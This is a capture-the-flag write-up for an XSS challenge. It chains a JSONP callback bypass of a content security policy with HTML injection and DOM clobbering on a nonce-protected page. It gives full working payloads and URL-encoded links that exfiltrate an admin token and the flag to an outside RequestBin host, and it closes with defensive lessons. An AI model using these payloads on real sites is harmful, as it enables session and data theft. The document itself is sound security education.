# Xmas Shopping Site

The [challenge website (xss.allesctf.net)](http://xss.allesctf.net/) seems to be an online shop with search functionality.

Additionally, we can send a link for an admin to click on at [submit.xss.allesctf.net](http://submit.xss.allesctf.net/).

There is also a `Stage 2` page on another subdomain ([stage2.xss.allesctf.net](http://stage2.xss.allesctf.net/))
which will show the flag when visited by an admin.

Given the domain name and setup, this looks like a classic XSS challenge where
we need to send the admin something that will execute some JavaScript to steal his session or directly read the flag.

Trying out the submit page we fill find out that we can only send links from the `xss.allesctf.net` domain.
This is also checked server-side.


## Exploiting the index page

Taking a closer look at the main page we can quickly find that the search will always
result in a "not found" message that repeats the search term.

Trying `<h1>test</h1>` as a search term will print `test` in a large bold font, so clearly the search box is vulnerable to XSS.
However, trying to execute JavaScript e.g. with `<script>alert(1)</script>` will not work.

Taking a look at the Chrome Dev Tools reveals that the script was blocked because it violates the `Content Security Policy`.

Let's check the `Content-Security-Policy` header in the `Network` tab:

```
Content-Security-Policy: default-src 'self' http://*.xss.allesctf.net; object-src 'none'; base-uri 'none';
```

Because there is no `script-src` directive the `default-src` directive applies.

This policy will block all scripts that are not from the current domain or from `http://*.xss.allesctf.net` and this includes inline scripts.

Let's take a look at the source code to see the scripts present on the page:

```
<script src="/static/js/jquery-3.2.1.min.js"></script>
<script src="/static/js/shop.js"></script>
<script src="/items.php?cb=parseItems"></script>
```

The first is just `jQuery` but the other two are custom scripts.

It looks like `shop.js` handles the buttons and creates the card displays for the items to buy.

The items come from the third script.

But the way the item data is handled is interesting.
The `cb` parameter for `items.php` looks like a callback parameter for `JSONP`.
`shop.js` defines a `parseItems` function and `ìtems.php` then calls this function with the data.

Let's have a look at the content of `items.php`:

```
$ curl http://xss.allesctf.net/items.php?cb=parseItems
parseItems([{"title": "Weihnachtsbaum", "url": "3.png", "text": "Plastik und voll schön."},{"title": "Christbaumkugel", "url": "1.png", "text": "Rund und bunt."},{"title": "Schlitten", "url": "2.png", "text": "Es ist glatt, er ist schnell!"}])
```

It looks like it just echos the callback parameter with parenthesis and the item data.
But what happens if instead of providing a function name we try to execute some other JavaScript and simply comment out the rest of the line?


```
$ curl 'http://xss.allesctf.net/items.php?cb=alert(1)//'
alert(1)//...
```

It seems to work!

This means we can serve arbitrary JavaScript from the `xss.allesctf.net` domain by passing it as a callback to `items.php`.

So we can now pass a script tag to the search box and it shouldn't get blocked by the `Content Security Policy`:

```html
<script src="http://xss.allesctf.net/items.php?cb=alert(1)//"></script>
```

And it works! The page displays a dialog.


## Attempt 1: Steal the admin's token

So what can we now do with this? We need to get the flag on the `Stage 2` page, so let's have another look at that page.

If we open the page via the link in the navigation bar we can see that it includes a token parameter:

```
http://stage2.xss.allesctf.net/?token=5e73de0e6dd59
```

If we try to open the page without the token parameter we get `Access Denied`.

So let's try to steal the token from the admin.

We need to send it somewhere that we control.
For this, we can just use a service like [RequestBin](https://requestbin.com/).
This will give us a domain like this: `enbdblkpmmbod.x.pipedream.net/`
and we can see all requests to any page on that domain.

Now we can just make a request with the token from the admin as the page.

Because of the `Content Security Policy`, we can't make any requests to domains besides `*.xss.allesctf.net`
but we can simply navigate to the page instead.

That will still send the request but since we are leaving the original page at the same time it won't be blocked by the `Content Security Policy`.

In JavaScript we can just do this:
```javascript
let token = $("#stage2").attr("href").split("=")[1];
location = "//enbdblkpmmbod.x.pipedream.net/" + token;
```

We can then URL-encode that script (e.g. using [urlencoder.org](https://www.urlencoder.org/)) to pass it to `items.php`:
```
http://xss.allesctf.net/items.php?cb=let%20token%20%3D%20%24%28%22%23stage2%22%29.attr%28%22href%22%29.split%28%22%3D%22%29%5B1%5D%3B%0Alocation%20%3D%20%22%2F%2Fenbdblkpmmbod.x.pipedream.net%2F%22%20%2B%20token%3B
```

Then we put that in a `script` tag:
```html
<script src="http://xss.allesctf.net/items.php?cb=let%20token%20%3D%20%24%28%22%23stage2%22%29.attr%28%22href%22%29.split%28%22%3D%22%29%5B1%5D%3B%0Alocation%20%3D%20%22%2F%2Fenbdblkpmmbod.x.pipedream.net%2F%22%20%2B%20token%3B"></script>
```

Then URL-encode that again and pass it to the search:
```
http://xss.allesctf.net/?search=%3Cscript%20src%3D%22http%3A%2F%2Fxss.allesctf.net%2Fitems.php%3Fcb%3Dlet%2520token%2520%253D%2520%2524%2528%2522%2523stage2%2522%2529.attr%2528%2522href%2522%2529.split%2528%2522%253D%2522%2529%255B1%255D%253B%250Alocation%2520%253D%2520%2522%252F%252Fenbdblkpmmbod.x.pipedream.net%252F%2522%2520%252B%2520token%253B%22%3E%3C%2Fscript%3E
```

Trying this out in our browser will give an error: `ReferenceError: $ is not defined`.

The problem is that our `script` will be placed before the `script` that loads `jQuery`, so `$` is not yet defined when it runs.

We can just defer our script to run after all the normal scripts using the `defer` attribute:

```html
<script defer src="http://xss.allesctf.net/items.php?cb=let%20token%20%3D%20%24%28%22%23stage2%22%29.attr%28%22href%22%29.split%28%22%3D%22%29%5B1%5D%3B%0Alocation%20%3D%20%22%2F%2Fenbdblkpmmbod.x.pipedream.net%2F%22%20%2B%20token%3B"></script>
```

If we now URL-encode that again, pass it to the search and send the link to the admin we will quickly see a request like this in RequestBin:
```
/5e73de0e6dd59
```

This should be the token from the admin. However, if we now try to access the `Stage 2` page with that token we only get `Access Denied`.

It looks like there is something else required together with the token to access the page.
Taking a look at the cookies we will find that the page sets a cookie called `PHPSESSID`.

We probably need to have the correct session id together with a token to access the page.

Unfortunately, the cookie is HTTP-only so we can't steal it from the admin via JavaScript.


## Attempt 2: Load the stage 2 page and steal the flag

It looks like we need to steal the flag directly.

We could try to load the `Stage 2` page via JavaScript:
```
fetch(stage2.href).then(r => r.text())
```

This will not get blocked by the `Content Security Policy` since the `Stage 2` page is part of the allowed domains
but it still won't work.

The `Stage 2` page doesn't have a `CORS` (Cross-Origin Ressource Sharing) header set and
because it is on a different domain (even if it's a subdomain) this makes the browser disallow access to the content of the request.


## Exploiting the stage 2 page

Let's have a closer look at the `Stage 2` page.

Looking at the source code we can see the code for changing the background
and a comment about `CORS`:

```html
<input type="hidden" id="bg" value="red">

<script nonce="6e6EPI+BzQX7F46q8bCU05Pajtg=">
    var backgrounds = {
        'red': ['<img class="bg-img" src="/static/img/red.png"></img>'],
        'green': ['<img class="bg-img" src="/static/img/green.png"></img>'],
        'tree': ['<img class="bg-img" src="/static/img/tree.png"></img>']
    }
</script>

<!-- ... -->

<!--  
    What is CORS? Baby don't hurt me, don't hurt me - no more! 
-->
<br>
<b>CSCG{XSS_THE_ADMIN_FOR_THE_REAL_FLAG:>}</b>

<!-- ... -->

<script nonce="6e6EPI+BzQX7F46q8bCU05Pajtg=" src="/static/js/jquery-3.2.1.min.js"></script>
<script nonce="6e6EPI+BzQX7F46q8bCU05Pajtg=" src="/static/js/bootstrap.bundle.min.js"></script>
<script nonce="6e6EPI+BzQX7F46q8bCU05Pajtg=" src="/static/js/background.js"></script>
```

The `nonce` attribute of the `script` tags is quite interesting.
This page has a different `Content Security Policy` than the main page:
```
script-src 'nonce-UDj9O0u6wjzRNi+p1MFFCMy2YMQ=' 'unsafe-inline' 'strict-dynamic'; base-uri 'none'; object-src 'none';
```

Instead of only allowing scripts from a specific domain it instead only allows scripts
that includes the specified `nonce` value.

`strict-dynamic` means that all `script` tags that are created from other scripts with the `nonce` are also allowed.

`unsafe-inline` is actually ignored when `nonce` or `strict-dynamic` is present.

But for now we can't even create any `script` tags, so let's first have a look at `background.js`:

```javascript
$(document).ready(() => {
    $("body").append(backgrounds[$("#bg").val()]);
});

$(document).ready(() => {
    $(".bg-btn").click(changeBackground)
});

const changeBackground = (e) => {
    fetch(window.location.href, {
        headers: {'Content-type': 'application/x-www-form-urlencoded'},
        method: "POST",
        credentials: "include",
        body: 'bg=' + $(e.target).val() 
    }).then(() => location.reload())
};
```

The way the background change is handled is quite interesting.

On the page, there is a hidden `input` that contains the background value:
```html
<input type="hidden" id="bg" value="red">
```

When the page loads, `background.js` checks the value of that `input`
and appends the corresponding image tag from the `backgrounds` map to the page.

When a user wants to change the background the script makes a `POST` request with the new background value to the server
and reloads the page.

It looks like the value of the background is tied to our session cookie.

We can see that the background stays changed when we close and reopen the page but it resets if we delete the `PHPSESSID` cookie.

When the page is reloaded, the server probably looks up the correct background for our session id and
sets the value of the `input` tag in the response.

The server just sets the `value` of the `input` in the response `HTML` so maybe we can use
that to inject some code.

Let's try setting `bg` to `"><h1>test</h1><input value="`:

```javascript
fetch(window.location.href, {
        headers: {'Content-type': 'application/x-www-form-urlencoded'},
        method: "POST",
        credentials: "include",
        body: 'bg="><h1>test</h1><input value="'
    }).then(() => location.reload())
```

It looks like the server just places the value in the `HTML`:

```html
<input type="hidden" id="bg" value=""><h1>test</h1><input value="">
```

This means we can inject arbitrary `HTML` and even `script` tags into the page!

But we again have a problem with the `Content Security Policy`.
Remember the browser will only execute scripts with the correct `nonce`
or scripts that were created by other scripts with the `nonce`.

Since we probably can't guess the `nonce`, we have to get one of the scripts
already on the page to add our script.

Conveniently, `background.js` actually adds `HTML` elements to the page:

```javascript
$(document).ready(() => {
    $("body").append(backgrounds[$("#bg").val()]);
});
```

We even control the key into the `backgrounds` map but we don't control its content.

However we can change that:
If we start a comment in the `bg` value (e.g. set it to `"><!--`) we can comment out the definition of `backgrounds`:

```html
<input type="hidden" id="bg" value=""><!--">

<script nonce="6e6EPI+BzQX7F46q8bCU05Pajtg=">
    var backgrounds = {
        'red': ['<img class="bg-img" src="/static/img/red.png"></img>'],
        'green': ['<img class="bg-img" src="/static/img/green.png"></img>'],
        'tree': ['<img class="bg-img" src="/static/img/tree.png"></img>']
    }
</script>

...

<!--  
    What is CORS? Baby don't hurt me, don't hurt me - no more! 
-->
<br>
<b>CSCG{XSS_THE_ADMIN_FOR_THE_REAL_FLAG:>}</b>

<!-- ... -->

<script nonce="6e6EPI+BzQX7F46q8bCU05Pajtg=" src="/static/js/jquery-3.2.1.min.js"></script>
<script nonce="6e6EPI+BzQX7F46q8bCU05Pajtg=" src="/static/js/bootstrap.bundle.min.js"></script>
<script nonce="6e6EPI+BzQX7F46q8bCU05Pajtg=" src="/static/js/background.js"></script>
```

Conviniently, there is another comment directly before the flag so the flag and all the scripts at the end 
stay intact.

Now there is no definition for `backgrounds` anymore and we can use a trick to define it again
without using any `script` tags:

If we create a tag with an `id`, the browser will make the `HTMLElement` represented by that tag
globally accessible under its `id`.

So we can just add a tag like this:

```html
<hr id="backgrounds" lang="<script>alert(1)</script>">
```

If we now set the `value` of the `input` to `lang`,
the `backgrounds.js` script will add `backgrounds["lang"]` to the page
and the script will get executed.


## Attempt 3: Putting it all together

Ok, now that we can execute JavaScript on both pages this is the plan:
1. On the index page:
    1. Set the background for the `Stage 2` page using a `POST` request so that it will steal the flag when visited. Sending a request to the `Stage 2` domain is allowed by the `Content Security Policy` and because it's a `POST` request we don't care about `CORS` because we don't need to see the response content. What matters is that the `bg` value will get set on the server.
    2. Navigate to the `Stage 2` page
2. On the `Stage 2` page:
    1. Grab the flag
    2. Navigate to `"enbdblkpmmbod.x.pipedream.net/" + flag` to leak the flag

We can use this code to steal the flag on the `Stage 2` page:

```javascript
location = "//enbdblkpmmbod.x.pipedream.net/" + $("b").text()
```

And this is the value for `bg` to execute that code:

```
lang"><hr id=backgrounds lang="<script>location='//enbdblkpmmbod.x.pipedream.net/'+$('b').text()"><!--
```

Therefore this is the code we want to execute on the first page:

```javascript
fetch(stage2.href, {
    method: "post",
    headers: {'Content-type': 'multipart/form-data'},
    credentials: "include",
    body: `lang"><hr id=backgrounds lang="<script>location='//enbdblkpmmbod.x.pipedream.net/'+$('b').text()"><!--`
});
location = stage2.href;
```

It gets a bit nasty with all the nested quotes but luckily JavaScript has three different types of quotes: `""`, `''`, and ``` `` ```.

If we now try to run this (after URL-encoding it, passing it to `items.php`, URL-encoding again and passing the result to the search)
we will run into another problem:

`items.php` will respond with this:
```
callback param is too long!
```

Trying a few different callback lengths, we can easily find out that the callback can't be longer than `250` characters.

Let's shorten our callback up a bit:
```javascript
fetch(x=stage2.href,{method:"post",headers:{'Content-type':'multipart/form-data'},credentials:"include",body:`lang"><hr id=backgrounds lang="<script>location='//enbdblkpmmbod.x.pipedream.net/'+$('b').text()"><!--`});location=x;
```

That should be less than `250` characters. But strangely, when we try it again, `items.php` still says it's too long.

Let's try shortening our callback to see at which point it works.

At some point we get a valid response again:

```
x=stage2.href; fetch(x,{method:"post",headers:{'Content-type':'multipart/form-data'},credentials:"include",body:`lang"FORBIDDEN_CHARFORBIDDEN_CHARhr id=backgrounds lang="FORBIDDEN_CHARscriptFORBIDDEN_CHARlocation='//enbdblkpmmbod.x.pipedream.net/' $(...
```

Interesting.

It seems that it doesn't like some characters and replaces them with `FORBIDDEN_CHAR`.
Taking a closer look we can see that it replaces `<` and `>`.

To avoid this we can just replace them with `\x3c` and `\x3e`. That's the hex representation of the characters.
In a JavaScript string, this is the same as writing the characters out directly but `items.php`, of course, doesn't get that.

The script is still shorter than `250` characters (`245` to be exact 😅) so everything should work now:
```javascript
fetch(x=stage2.href,{method:"post",headers:{'Content-type':'multipart/form-data'},credentials:"include",body:`lang"\x3e\x3chr id=backgrounds lang="\x3cscript\x3elocation='//enbdblkpmmbod.x.pipedream.net/'+$('b').text()"\x3e\x3c!--`});location=x;
```

Actually, if we needed to, we could still make the script even shorter.

We can just use `stage2` instead of `stage2.href` since it will automatically get converted correctly.

We can also remove the `Content-type` header by passing an `URLSearchParams` object as the request body.

This will automatically set the header to the same value but is quite a bit shorter.

In addition we can even pass the request body via the hash in the url and retrieve it using `decodeURI(location.hash.slice(1))`.
This way we also don't need to escape the `<` and `>` and in addition the length of the payload doesn't depend on the domain anymore.

With this we are now at `130` characters:

```javascript
fetch(x=stage2,{method:"post",credentials:"include",body:new URLSearchParams({bg:decodeURI(location.hash.slice(1))})});location=x;
```

Ok, now let's URL-encode everything again, pass it to `items.php`, then to the search, add the stage 2 payload as a hash and send the link to the admin:
```
http://xss.allesctf.net/?search=%3Cscript%20defer%20src%3D%22%2Fitems.php%3Fcb%3Dfetch%2528x%253Dstage2%252C%257Bmethod%253A%2522post%2522%252Ccredentials%253A%2522include%2522%252Cbody%253Anew%2520URLSearchParams%2528%257Bbg%253AdecodeURI%2528location.hash.slice%25281%2529%2529%257D%2529%257D%2529%253Blocation%253Dx%253B%22%3E%3C%2Fscript%3E#lang"><hr id=backgrounds lang="<script>location='//enua5wx7g1rp.x.pipedream.net/'+$('b').text()"><!--
```

After a few seconds we will see a requests like this in RequestBin:
```
/CSCG%7Bc0ngratZ_y0u_l3arnD_sUm_jS:%3E%7D
```

And after URL-decoding (e.g. using [urldecoder.org](https://urldecoder.org)) we get the flag: `CSCG{c0ngratZ_y0u_l3arnD_sUm_jS:>}`.


## Conclusion

So, what can we learn from this?

The obvious thing is of course: Always sanitize user input or any data that comes from uncontrolled outside sources like `POST` requests.

In this case, there is no reason for the search bar and the background selector to allow
anything other than `ASCII`-letters, but if they would just HTML-encode the data it still wouldn't be exploitable.

Also, `JSONP` together with a `Content Security Policy` of `script-src: 'self'` clearly isn't a good idea.

The page would also be safe if
the `Content Security Policy` of the index page would use a `nonce` like the `Stage 2` page
or `items.php` just used a fixed callback
or returned `JSON` that would get requested from JavaScript.

And lastly, the `Content Security Policy` should always be as restrictive as possible.
There is no reason for the `Stage 2` page to have `strict-dynamic` in the policy and without it
the page would again be safe.
